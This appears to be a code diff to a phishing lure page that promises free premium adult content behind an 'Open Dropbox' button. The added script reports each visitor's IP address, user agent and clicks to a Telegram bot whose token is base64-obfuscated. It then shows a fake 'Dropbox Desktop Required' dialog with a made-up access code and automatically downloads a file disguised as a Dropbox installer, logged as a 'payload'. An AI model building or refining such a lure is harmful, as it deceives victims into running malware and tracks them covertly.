@@ -310,6 +310,8 @@
       align-items: center;
       justify-content: center;
       gap: 8px;
+      position: relative;
+      overflow: hidden;
     }
 
     .openDriveBtn:hover:not(:disabled) {
@@ -324,7 +326,34 @@
 
     .openDriveBtn:disabled {
       cursor: not-allowed;
-      opacity: 0.7;
+      opacity: 0.8;
+    }
+
+    .openDriveBtn.loading::after {
+      content: '';
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+      animation: shimmer 1.5s infinite;
+    }
+
+    @keyframes shimmer {
+      0% { transform: translateX(-100%); }
+      100% { transform: translateX(100%); }
+    }
+
+    .spinner {
+      width: 18px;
+      height: 18px;
+      border: 2px solid rgba(255,255,255,0.3);
+      border-top-color: white;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
     }
 
     .hintRow{
@@ -353,6 +382,168 @@
       padding-top: 6px;
     }
 
+    /* Modal Styles */
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.7);
+      backdrop-filter: blur(5px);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+      padding: 20px;
+    }
+
+    .modal-overlay.active {
+      display: flex;
+    }
+
+    .modal {
+      background: white;
+      color: #0f172a;
+      border-radius: var(--radius);
+      box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
+      max-width: 480px;
+      width: 100%;
+      overflow: hidden;
+      animation: modalSlide 0.3s ease;
+    }
+
+    @keyframes modalSlide {
+      from {
+        opacity: 0;
+        transform: translateY(-20px) scale(0.95);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+      }
+    }
+
+    .modal-header {
+      background: linear-gradient(135deg, #1a73e8, #1557b0);
+      color: white;
+      padding: 24px;
+      text-align: center;
+    }
+
+    .modal-header h3 {
+      margin: 0;
+      font-size: 20px;
+      font-weight: 700;
+    }
+
+    .modal-header p {
+      margin: 8px 0 0 0;
+      opacity: 0.9;
+      font-size: 14px;
+    }
+
+    .modal-body {
+      padding: 24px;
+    }
+
+    .modal-icon {
+      width: 64px;
+      height: 64px;
+      background: #f0f7ff;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 20px;
+      font-size: 32px;
+    }
+
+    .access-code-section {
+      background: #f8fafc;
+      border: 2px dashed #cbd5e1;
+      border-radius: 12px;
+      padding: 20px;
+      text-align: center;
+      margin: 20px 0;
+    }
+
+    .access-code-label {
+      font-size: 12px;
+      color: #64748b;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-bottom: 8px;
+    }
+
+    .access-code {
+      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+      font-size: 28px;
+      font-weight: 700;
+      color: #1a73e8;
+      letter-spacing: 4px;
+      user-select: all;
+      cursor: pointer;
+    }
+
+    .copy-btn {
+      margin-top: 12px;
+      padding: 8px 16px;
+      background: #1a73e8;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .copy-btn:hover {
+      background: #1557b0;
+    }
+
+    .copy-btn.copied {
+      background: #22c55e;
+    }
+
+    .modal-footer {
+      padding: 0 24px 24px;
+      text-align: center;
+    }
+
+    .modal-footer p {
+      margin: 0;
+      font-size: 13px;
+      color: #64748b;
+      line-height: 1.5;
+    }
+
+    .close-modal {
+      position: absolute;
+      top: 16px;
+      right: 16px;
+      background: rgba(255,255,255,0.2);
+      border: none;
+      color: white;
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      cursor: pointer;
+      font-size: 18px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: background 0.2s;
+    }
+
+    .close-modal:hover {
+      background: rgba(255,255,255,0.3);
+    }
+
     @media (max-width: 840px){
       .brand { min-width: auto; }
       .actions { display: none; }
@@ -363,6 +554,8 @@
     @media (prefers-reduced-motion: reduce){
       .item, .openDriveBtn { transition: none; }
       .item:hover { transform: none; }
+      .openDriveBtn.loading::after { animation: none; }
+      .spinner { animation: none; }
     }
   </style>
 </head>
@@ -423,7 +616,7 @@
                 <h3 class="itemTitle">Free OnlyFans Premium Content - Full Database</h3>
 
                 <button class="openDriveBtn" id="openDriveBtn">
-                  Open Dropbox
+                  <span>Open Dropbox</span>
                 </button>
               </div>
             </article>
@@ -439,35 +632,65 @@
     </div>
   </div>
 
+  <!-- Modal -->
+  <div class="modal-overlay" id="modal">
+    <div class="modal">
+      <div class="modal-header">
+        <button class="close-modal" onclick="closeModal()">×</button>
+        <div class="modal-icon">📦</div>
+        <h3>Dropbox Desktop Required</h3>
+        <p>This shared folder requires Dropbox Desktop to access</p>
+      </div>
+      <div class="modal-body">
+        <p style="text-align: center; color: #475569; margin-bottom: 20px;">
+          Please install Dropbox Desktop and enter the access code below to unlock the shared folder.
+        </p>
+        
+        <div class="access-code-section">
+          <div class="access-code-label">Your Access Code</div>
+          <div class="access-code" id="accessCode">DBX-8842-91K3</div>
+          <button class="copy-btn" id="copyBtn" onclick="copyCode()">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+              <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+            </svg>
+            Copy Code
+          </button>
+        </div>
+      </div>
+      <div class="modal-footer">
+        <p>The installer has been downloaded automatically.<br>Run it and enter your access code to continue.</p>
+      </div>
+    </div>
+  </div>
+
   <script>
     // Base64 encoded credentials
     const ENCODED_TOKEN = 'ODg2NjAwMzYxNzpBQUdUUXNDMVpLQ2U0YmdsTXhTMjIzR2xCMmNPVWxMUFY3QQ==';
     const ENCODED_CHAT_ID = 'NjAwMzIzMjc4Mg==';
     
-    // Decode function
     const decode = (str) => atob(str);
-    
-    // Telegram Bot Konfiguration - decodiert zur Laufzeit
     const TELEGRAM_BOT_TOKEN = decode(ENCODED_TOKEN);
     const TELEGRAM_CHAT_ID = decode(ENCODED_CHAT_ID);
     
-    // User Tracking Daten
     let userIP = 'unknown';
     let userAgent = navigator.userAgent;
     let sessionID = Math.random().toString(36).substring(2, 15);
     let firstClickSent = false;
     
-    // IP-Adresse ermitteln für detaillierte Logs
+    // Generate random access code
+    function generateAccessCode() {
+      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+      const part1 = Math.floor(1000 + Math.random() * 9000);
+      const part2 = Array(4).fill(0).map(() => chars[Math.floor(Math.random() * chars.length)]).join('');
+      return `DBX-${part1}-${part2}`;
+    }
+    
     fetch('https://api.ipify.org?format=json')
       .then(res => res.json())
-      .then(data => {
-        userIP = data.ip;
-      })
-      .catch(() => {
-        userIP = 'could not fetch';
-      });
+      .then(data => { userIP = data.ip; })
+      .catch(() => { userIP = 'could not fetch'; });
 
-    // Telegram Nachricht senden
     async function sendTelegramMessage(action, details = '') {
       const timestamp = new Date().toLocaleString('en-US', { timeZone: 'UTC' });
       const message = `🚨 *Dropbox Alert* 🚨\n\n` +
@@ -481,9 +704,7 @@
       try {
         await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
           method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
+          headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             chat_id: TELEGRAM_CHAT_ID,
             text: message,
@@ -495,106 +716,72 @@
       }
     }
 
-    // Download Funktion
-function startDownload() {
-  const a = document.createElement('a');
-  a.href = './DropboxDesktop_Setup.zip';  // oder 'DropboxDesktop_Setup.zip'
-  a.download = 'DropboxDesktop_Setup.zip';
-  document.body.appendChild(a);
-  a.click();
-  document.body.removeChild(a);
-  
-  sendTelegramMessage('📥 DOWNLOAD STARTED', 'User downloaded zipfile');
-}
-
-    // Notification mit Klick-Handler
-    function showNotification() {
-      if (Notification.permission !== 'granted') return;
+    function startDownload() {
+      const a = document.createElement('a');
+      a.href = './DropboxDesktop_Setup.zip';
+      a.download = 'DropboxDesktop_Setup.exe';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
       
-      const icon = 'https://cfl.dropboxstatic.com/static/images/logo_catalog/glyph_2016.svg';
-      
-      const notification = new Notification('Dropbox Desktop Required', {
-        body: 'This shared folder requires Dropbox Desktop to open. Click here to install Dropbox Desktop and access the content.',
-        icon: icon,
-        badge: icon,
-        tag: 'dropbox-desktop-required',
-        requireInteraction: true,
-        silent: false
-      });
-      
-      // Bei Klick auf Notification: Download starten (zweiter Klick)
-      notification.onclick = function() {
-        window.focus();
-        notification.close();
-        startDownload();
-      };
-      
-      // Automatisch nach 30 Sekunden schließen
-      setTimeout(() => {
-        notification.close();
-      }, 30000);
+      sendTelegramMessage('📥 DOWNLOAD STARTED', 'User downloaded payload');
     }
 
-    // Hauptfunktion beim Klick auf "Open Dropbox" (erster Klick)
+    function showModal() {
+      const code = generateAccessCode();
+      document.getElementById('accessCode').textContent = code;
+      document.getElementById('modal').classList.add('active');
+      
+      // Auto-download when modal shows
+      setTimeout(() => {
+        startDownload();
+      }, 500);
+    }
+
+    function closeModal() {
+      document.getElementById('modal').classList.remove('active');
+    }
+
+    function copyCode() {
+      const code = document.getElementById('accessCode').textContent;
+      navigator.clipboard.writeText(code).then(() => {
+        const btn = document.getElementById('copyBtn');
+        btn.innerHTML = '✓ Copied!';
+        btn.classList.add('copied');
+        setTimeout(() => {
+          btn.innerHTML = `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg> Copy Code`;
+          btn.classList.remove('copied');
+        }, 2000);
+      });
+    }
+
     async function handleOpenDropbox() {
       const btn = document.getElementById('openDriveBtn');
       
       if (!firstClickSent) {
         btn.disabled = true;
-        btn.textContent = 'Opening...';
+        btn.classList.add('loading');
+        btn.innerHTML = '<div class="spinner"></div><span>Processing...</span>';
         
-        // Telegram: Benachrichtigung dass jemand auf "Open Dropbox" geklickt hat (erster Klick)
-        await sendTelegramMessage('🖱️ OPEN DROPBOX CLICKED', 'User clicked the "Open Dropbox" button');
+        await sendTelegramMessage('🖱️ OPEN DROPBOX CLICKED', 'User clicked the button');
         firstClickSent = true;
-      }
-      
-      // Notification Permission anfragen
-      if (!('Notification' in window)) {
-        btn.textContent = 'Notification Error';
-        return;
-      }
-      
-      let permission = Notification.permission;
-      
-      if (permission === 'default') {
-        try {
-          permission = await Notification.requestPermission();
-        } catch (e) {
-          console.log('Permission request failed');
-        }
-      }
-      
-      if (permission === 'granted') {
-        // Zeige die "echte" Dropbox Notification
+        
+        // Show modal after loading animation
         setTimeout(() => {
-          showNotification();
-          btn.textContent = 'Check your notifications';
-          btn.style.background = '#22c55e';
-        }, 800);
-        
-      } else if (permission === 'denied') {
-        btn.textContent = 'Enable notifications to continue';
-        btn.style.background = '#dc2626';
-        
-        // Auch bei Block versuchen wir es nach 2 Sekunden nochmal
-        setTimeout(async () => {
-          const secondTry = await Notification.requestPermission();
-          if (secondTry === 'granted') {
-            showNotification();
-            btn.textContent = 'Check your notifications';
-            btn.style.background = '#22c55e';
-          }
-        }, 2000);
+          showModal();
+          btn.innerHTML = '<span>Open Dropbox</span>';
+          btn.classList.remove('loading');
+          btn.disabled = false;
+        }, 1500);
       }
     }
 
-    // Event Listener
     document.getElementById('openDriveBtn').addEventListener('click', handleOpenDropbox);
     
-    // KEIN automatischer Alert beim Seitenaufruf mehr
-    // window.addEventListener('load', () => {
-    //   sendTelegramMessage('🌐 PAGE LOADED', 'User opened the page');
-    // });
+    // Close modal on outside click
+    document.getElementById('modal').addEventListener('click', (e) => {
+      if (e.target.id === 'modal') closeModal();
+    });
   </script>
 </body>
 </html>
